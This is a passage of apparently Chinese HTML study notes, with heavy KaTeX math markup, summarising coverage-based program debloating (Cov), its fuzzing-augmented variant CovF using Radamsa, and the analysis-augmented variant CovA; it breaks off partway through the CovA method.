id="3.2-cov%3Acoverage-based-debloating" tabindex="-1">3.2 Cov:Coverage-Based Debloating</h4><ul><li><p>给定一个程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>和输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> Instrument(启动,引导?) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 使用<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 识别出运行的语句,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq>会删除<strong>未被使用的语句</strong>和<strong>使用过但不需要</strong>(比如定义了但未被使用的变量)的语句</p></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> 原型 使用 llvm-cov 和 gcov:依赖于Clang构建 抽象语法树(AST abstract syntax tree),遍历AST上所有语句,通过分析覆盖报告<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq>找到为执行的语句进行删除,同时通过依赖分析,还可以删除其它不必要的语句</p><ul><li><ol><li>“dangling”(悬空指令):没有实际操作且条件没有实际作用的指令,如 if(x==0){}</li></ol></li><li><ol start="2"><li>未使用的变量命名</li></ol></li><li><ol start="3"><li>未使用的标签语句</li></ol></li></ul></li></ul><h4 id="3.3-covf%3A-coverage-based-debloating-with-fuzz-based-augmentation" tabindex="-1">3.3 CovF: Coverage-Based Debloating with Fuzz-Based Augmentation</h4><ul><li><strong>问题</strong>:基于覆盖率的方法通常会消除未执行的代码生成过度简化的代码,即过拟合</li><li><strong>解决</strong>:开发CovF,基于模糊测试增强的方法,提升精简后程序的鲁棒性</li><li><strong>方法描述</strong>:<ul><li><ol><li>给定程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>和输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,使用<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq>生成精简程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ol></li><li><ol start="2"><li>基于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>进行模糊测试生成输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>,使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq> 与 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 鲁棒性相关,即可以使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>崩溃或无法终止</li></ol><ul><li>当前实现中CovF使用 <strong>黑盒模糊测试工具 Radamsa</strong> 应用于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,生成<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mrow><mi>i</mi><mi>n</mi><mi>i</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">I&#x27;_{init}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ini</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq>然后运行<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>对<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mrow><mi>i</mi><mi>n</mi><mi>i</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">I&#x27;_{init}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ini</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq>进行测试,识别出 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><msubsup><mi>I</mi><mrow><mi>i</mi><mi>n</mi><mi>i</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">I&#x27;\in I&#x27;_{init}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.791em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ini</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq>使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub><mo stretchy="false">(</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{cov}(I&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>崩溃或无法终止</li></ul></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">CovF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>保留被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo separator="true">,</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I,I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>执行的语句,删除其它语句,得到最终程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi><mi>f</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{covf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ol></li></ul></li><li><strong>注意</strong>:原始程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>可能本来就存在鲁棒性问题,该问题并不是由去膨胀引起的,CovF只是通过模糊测试找到了这些问题</li></ul><h4 id="3.4-cova%3A-coverage-based-debloating-with-analysis-based-augmentation" tabindex="-1">3.4 CovA: Coverage-Based Debloating with Analysis-Based Augmentation</h4><ul><li><strong>问题</strong>:CovF方法可以通过 产生 不合规的输入增强程序的鲁棒性,但这些输入更多锻炼了非核心逻辑,但没有锻炼到其它不同特性<ul><li>例子:对输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>:</mo><mi mathvariant="normal">&quot;</mi><mo>−</mo><mi>m</mi><mn>777</mn><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">i:&quot;-m 777 testdir&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord">777</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord">&quot;</span></span></span></span></eq>很难模糊测试到另一个输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>:</mo><mi mathvariant="normal">&quot;</mi><mo>−</mo><mi>m</mi><mi>a</mi><mo>=</mo><mi>r</mi><mi>w</mi><mi>x</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">i&#x27;:&quot;-m a=rwx testdir&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ma</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord">&quot;</span></span></span></span></eq>,这两个鲁棒相关,但<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">i&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>涉及到另一个功能<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mtext>使用符号表示权限而不是数字</mtext><mo separator="true">,</mo><mtext>创建一个目录</mtext></mrow><annotation encoding="application/x-tex">f:使用符号表示权限而不是数字,创建一个目录</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">使用符号表示权限而不是数字</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">创建一个目录</span></span></span></span></eq>,因此模糊测试很难保留该功能<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq></li></ul></li><li><strong>方法</strong>:<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>通过 对函数间的依赖关系和精简后的程序运行踪迹 进行 静态和静态分析 推断 需要被增强的相关代码</li><li><strong>方法效果</strong>:<ul><li><ol><li>与CovF相比,直接识别与功能相关的函数并保留</li></ol></li><li><ol start="2"><li>通过对函数进行增强,降低了生成 语法或语义无用的程序(e.g.:有循环但没break的语句)</li></ol></li><li><ol start="3"><li>CovA对每一个函数计算一个增强分数,是对与所需功能的相关估计,该分数基于函数的依赖关系,执行频率和覆盖变化,越高与功能相关性越高</li></ol></li><li><ol start="4"><li>针对不同的输入时,如果一个方法的覆盖率经常发生变化,则该方法需要进行额外的增强</li></ol></li><li><ol start="5"><li>最后我们可以根据得到的分数选择前<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></eq>个函数进行增强</li></ol></li></ul></li><li><strong>方法具体</strong>:给定程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>和输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,增强阈值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>o</mi><msub><mi>p</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">top_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq><ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation 